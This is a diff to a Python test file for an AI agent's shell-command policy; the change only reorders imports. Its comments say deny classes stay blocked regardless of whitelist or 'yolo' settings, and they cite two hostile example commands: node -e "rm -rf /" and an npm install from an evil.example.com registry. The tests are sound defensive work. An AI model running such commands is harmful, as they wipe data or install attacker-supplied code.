@@ -183,8 +183,8 @@ def test_benign_commands_pass(command: str):
 
 def test_checker_independent_of_whitelist_empty_rules():
     # WhitelistRules 全空时 8 类仍拦（独立于白名单）——用 ShellPolicy 验证
-    from project_agent.tools.shell_policy import ShellPolicy, WhitelistRules
     from project_agent.tools.knobs import Boundary, Interrupt, ShellKnobs
+    from project_agent.tools.shell_policy import ShellPolicy, WhitelistRules
 
     rules = WhitelistRules()
     knobs = ShellKnobs(
@@ -203,8 +203,8 @@ def test_checker_independent_of_whitelist_empty_rules():
 
 
 def test_yolo_still_blocks_deny_classes():
-    from project_agent.tools.shell_policy import ShellPolicy
     from project_agent.tools.knobs import Boundary, Interrupt, ShellKnobs
+    from project_agent.tools.shell_policy import ShellPolicy
 
     knobs = ShellKnobs(
         boundary=Boundary.FULL,
@@ -221,8 +221,8 @@ def test_yolo_still_blocks_deny_classes():
 def test_allow_hit_does_not_save_deny_class():
     # allow 命中 deny 类照样拦（node -e "rm -rf /" 命中 allow "node *" 仍 deny 类 1；
     # npm install --registry=http://evil.example.com 命中 allow "npm install *" 仍 deny 类 6）
-    from project_agent.tools.shell_policy import ShellPolicy, WhitelistRules
     from project_agent.tools.knobs import ShellKnobs
+    from project_agent.tools.shell_policy import ShellPolicy, WhitelistRules
 
     rules = WhitelistRules(
         allow_read=("node *", "npm install *"),
